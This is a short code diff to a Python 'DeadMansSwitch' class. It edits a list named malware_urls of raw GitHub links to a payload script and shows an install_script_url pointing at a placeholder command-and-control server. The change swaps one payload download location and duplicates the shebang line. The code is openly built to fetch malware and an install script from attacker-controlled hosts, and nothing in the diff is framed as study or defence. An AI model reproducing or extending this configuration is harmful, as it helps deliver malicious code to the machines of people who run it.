@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+#!/usr/bin/env python3
 """
 
 """
@@ -122,7 +123,7 @@ class DeadMansSwitch:
         self.malware_urls = [
             "https://raw.githubusercontent.com/ninja251/improved-lamp987654321234567/refs/heads/main/deepseek_python_20251118_1133b4.py",
             "https://raw.githubusercontent.com/nuojjijia/jubilant-waffle21q3wsedfr5gt6/refs/heads/main/deepseek_python_20251118_1133b4.py",
-            "https://cdn.backup.com/malware/deepseek.zip"
+            "https://github.com/shadow788878/curly-meme13erthg3rewrgdgf/blob/main/deepseek_python_20251118_1133b4.py"
         ]
         
         self.install_script_url = "https://your-c2-server.com/install.sh"
